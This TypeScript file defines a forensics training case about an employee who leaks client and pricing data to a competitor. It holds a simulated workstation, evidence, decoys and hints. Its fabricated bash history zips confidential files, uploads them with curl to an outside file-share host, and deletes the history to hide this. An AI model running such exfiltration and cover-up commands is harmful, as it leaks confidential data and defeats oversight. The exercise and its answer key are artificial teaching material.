import { ep } from '../fs/bytes'
import { docx, jpegWithExif, pdf, zip } from '../fs/formats'
import { photoJpg, upload_confirmJpg } from '../fs/fixtures'
import type { Case } from './index'

const H = '/home/dreyes'

const clients = `client_id,company,contact,email,annual_value_usd,renewal
C-1001,Aldermoor Logistics,J. Patel,j.patel@aldermoor.example,412000,2025-06-30
C-1002,Brightwater Foods,S. Kim,skim@brightwater.example,288500,2025-05-15
C-1003,Castellan Health,M. Ortiz,mortiz@castellan.example,650000,2025-09-01
C-1004,Dunmore Retail,A. Novak,anovak@dunmore.example,174250,2025-04-20
C-1005,Everly Freight,R. Chen,rchen@everly.example,523900,2025-07-11
`
const pricing = `sku,tier,list_usd,floor_usd,notes
NW-AN-ENT,Enterprise,120000,86000,floor approved by VP only
NW-AN-PRO,Professional,48000,39000,
NW-AN-DASH,Dashboards add-on,18000,12500,bundle discount max 30%
`

const oldHistory = `ls
cd Documents
${ep('2025-03-13T22:58:41Z')}
ls -la
${ep('2025-03-13T23:02:15Z')}
zip /tmp/q3_clients.zip clients_q3.csv pricing_2025.csv
${ep('2025-03-13T23:03:10Z')}
curl -s -F "file=@/tmp/q3_clients.zip" https://dropshare.io/api/upload
${ep('2025-03-13T23:04:38Z')}
gnome-screenshot -f ~/Pictures/Screenshot_2025-03-13_23-04-40.jpg
${ep('2025-03-13T23:07:50Z')}
rm /tmp/q3_clients.zip ~/Pictures/Screenshot_2025-03-13_23-04-40.jpg ~/Downloads/Crestline_Offer.pdf
${ep('2025-03-13T23:08:05Z')}
rm ~/.bash_history
`

export const insider: Case = {
  id: 'insider',
  title: 'The Resignation',
  difficulty: 'Easy',
  label: 'NWA-WS-0142',
  brief: [
    'Daniel Reyes, a senior account manager at Northwind Analytics, resigned on 14 March 2025 and joined competitor Crestline Partners.',
    'Two weeks later Crestline began approaching Northwind clients using exact renewal dates and floor pricing.',
    'You have a forensic image of his workstation home directory. HR says he "cleaned up his laptop" before returning it.',
  ],
  objectives: [
    'Recover deleted files that show what was taken, how, and why.',
    'Build a timeline of his last two days with accurate UTC timestamps.',
  ],
  ops: [
    { op: 'mkdir', path: '/home', t: '2024-11-04T08:00:00Z' },
    { op: 'mkdir', path: H, t: '2024-11-04T08:00:00Z' },
    { op: 'mkdir', path: `${H}/Documents`, t: '2024-11-04T08:01:00Z' },
    { op: 'mkdir', path: `${H}/Downloads`, t: '2024-11-04T08:01:00Z' },
    { op: 'mkdir', path: `${H}/Pictures`, t: '2024-11-04T08:01:00Z' },
    { op: 'mkdir', path: `${H}/.config`, t: '2024-11-04T08:01:00Z' },
    { op: 'mkdir', path: '/tmp', t: '2024-11-04T08:00:00Z' },
    { op: 'write', path: '/tmp/.X0-lock', t: '2025-03-13T08:55:02Z', data: '      1402\n', hidden: true },
    { op: 'write', path: `${H}/.config/user-dirs.dirs`, t: '2024-11-04T08:01:00Z', data: 'XDG_DOCUMENTS_DIR="$HOME/Documents"\nXDG_DOWNLOAD_DIR="$HOME/Downloads"\nXDG_PICTURES_DIR="$HOME/Pictures"\n' },
    { op: 'write', path: `${H}/.bashrc`, t: '2024-11-04T08:01:00Z', data: '# ~/.bashrc\nexport HISTTIMEFORMAT="%F %T "\nalias ll="ls -la"\n' },
    { op: 'write', path: `${H}/Documents/clients_q3.csv`, t: '2025-02-20T10:12:00Z', data: clients },
    { op: 'write', path: `${H}/Documents/pricing_2025.csv`, t: '2025-01-08T15:40:00Z', data: pricing },
    { op: 'write', path: `${H}/Documents/meeting_notes.txt`, t: '2025-03-03T14:05:00Z', data: 'Weekly pipeline sync\n- Castellan renewal on track\n- Everly wants dashboards add-on quote\n- Offsite planning: vote by Friday\n' },
    { op: 'write', path: `${H}/Documents/grocery.txt`, t: '2025-03-08T11:20:00Z', data: 'eggs\noat milk\ncoffee beans\nbatteries (AA)\n' },
    { op: 'write', path: `${H}/Pictures/offsite_2024.jpg`, t: '2024-12-02T16:30:00Z', data: jpegWithExif(photoJpg, { make: 'Google', model: 'Pixel 8', dateTimeOriginal: '2024:11:29 12:14:03', offsetTimeOriginal: '+00:00' }) },
    { op: 'write', path: `${H}/Downloads/Crestline_Offer.pdf`, t: '2025-03-12T18:30:00Z', data: pdf(['CRESTLINE PARTNERS - OFFER OF EMPLOYMENT', '', 'Candidate: Daniel Reyes', 'Position: Director, Client Growth', 'Base salary: USD 185,000', 'Signing bonus: USD 40,000, conditional on', '"bringing a book of business" of at least 5 accounts.', 'Start date: 24 March 2025']) },
    { op: 'write', path: `${H}/Documents/resignation_letter.docx`, t: '2025-03-13T09:15:00Z', data: docx(['Dear Priya,', 'Please accept this letter as formal notice of my resignation, effective 14 March 2025.', 'Daniel'], { creator: 'Daniel Reyes', lastModifiedBy: 'Daniel Reyes', revision: 2, created: '2025-03-13T09:15:00Z', modified: '2025-03-13T09:31:00Z', title: 'Resignation' }, '2025-03-13 09:31:00') },
    { op: 'access', path: `${H}/Documents/clients_q3.csv`, t: '2025-03-13T22:59:30Z' },
    { op: 'write', path: `${H}/.bash_history`, t: '2025-03-13T23:02:15Z', data: oldHistory.split('\n').slice(0, 6).join('\n') + '\n' },
    { op: 'write', path: '/tmp/q3_clients.zip', t: '2025-03-13T23:02:15Z', data: zip([{ name: 'clients_q3.csv', data: clients, mtime: '2025-02-20 10:12:00' }, { name: 'pricing_2025.csv', data: pricing, mtime: '2025-01-08 15:40:00' }]) },
    { op: 'write', path: `${H}/Pictures/Screenshot_2025-03-13_23-04-40.jpg`, t: '2025-03-13T23:04:40Z', data: jpegWithExif(upload_confirmJpg, { make: 'GNOME', model: 'gnome-screenshot', software: 'gnome-screenshot 41.0', dateTimeOriginal: '2025:03:13 23:04:40' }) },
    { op: 'write', path: `${H}/.bash_history`, t: '2025-03-13T23:08:05Z', data: oldHistory, as: 'old-history' },
    { op: 'delete', path: '/tmp/q3_clients.zip', t: '2025-03-13T23:07:50Z' },
    { op: 'delete', path: `${H}/Pictures/Screenshot_2025-03-13_23-04-40.jpg`, t: '2025-03-13T23:07:50Z' },
    { op: 'delete', path: `${H}/Downloads/Crestline_Offer.pdf`, t: '2025-03-13T23:07:50Z' },
    { op: 'delete', path: `${H}/Documents/grocery.txt`, t: '2025-03-13T23:07:51Z' },
    { op: 'delete', path: `${H}/.bash_history`, t: '2025-03-13T23:08:05Z' },
    { op: 'write', path: `${H}/.bash_history`, t: '2025-03-13T23:09:12Z', data: `${ep('2025-03-13T23:09:00Z')}\nls\n${ep('2025-03-13T23:09:05Z')}\nlibreoffice Documents/resignation_letter.docx\n` },
  ],
  evidence: [
    { id: 'offer', label: 'Crestline_Offer.pdf (deleted)', find: { path: `${H}/Downloads/Crestline_Offer.pdf` }, event: 'Downloads job offer from Crestline, bonus tied to "bringing a book of business"', t: '2025-03-12T18:30:00Z', timeSource: 'Inode birth time (B) of the deleted PDF', why: 'Motive: the signing bonus depends on bringing clients.' },
    { id: 'resign', label: 'resignation_letter.docx', find: { path: `${H}/Documents/resignation_letter.docx` }, event: 'Drafts resignation letter', t: '2025-03-13T09:15:00Z', timeSource: 'Inode birth time, confirmed by docx core.xml "created"', why: 'Establishes intent to leave before the data was taken.' },
    { id: 'zip', label: 'q3_clients.zip (deleted)', find: { path: '/tmp/q3_clients.zip' }, event: 'Zips client list and pricing into /tmp/q3_clients.zip', t: '2025-03-13T23:02:15Z', timeSource: 'Inode birth time (B) of the deleted zip. Entry times inside the zip are the source files\' dates, not the zip date', why: 'Shows exactly which confidential data was packaged.' },
    { id: 'history', label: '.bash_history (deleted original)', find: { path: 'old-history' }, event: 'Uploads the zip to dropshare.io with curl', t: '2025-03-13T23:03:10Z', timeSource: 'The #epoch line above the curl command (date -d @1741906990). The file\'s own M time is the shell exit time', why: 'Direct proof of exfiltration and of the cover-up (rm commands).' },
    { id: 'shot', label: 'Screenshot_2025-03-13_23-04-40.jpg (deleted)', find: { path: `${H}/Pictures/Screenshot_2025-03-13_23-04-40.jpg` }, event: 'Screenshots the "Upload complete" page', t: '2025-03-13T23:04:40Z', timeSource: 'Inode birth time, matching the EXIF time and the filename', why: 'Confirms the upload succeeded and shows the share link.' },
  ],
  decoys: [
    { label: 'grocery.txt (deleted)', find: { path: `${H}/Documents/grocery.txt` }, why: 'A deleted file is not automatically evidence. This is a shopping list.' },
    { label: 'offsite_2024.jpg', find: { path: `${H}/Pictures/offsite_2024.jpg` }, why: 'An ordinary team photo from November 2024, unrelated to the leak.' },
    { label: '/tmp/.X0-lock (hidden)', find: { path: '/tmp/.X0-lock' }, why: 'A hidden file doesn\'t make it suspicious. This is the X server lock file.' },
  ],
  hints: [
    'Plain `ls` only shows live directory entries. Try `fls -r -d /` to list deleted entries (marked with *).',
    'A deleted file\'s inode still points at its data blocks. `icat <inode>` recovers it into /recovered, where you can `tag` it.',
    'The new .bash_history is suspiciously short. There are two .bash_history inodes. Recover the deleted one and read it with `cat`.',
    'Lines like #1741906990 are Unix epochs. `date -d @1741906990` converts them to UTC. That is the time the next command ran.',
  ],
}
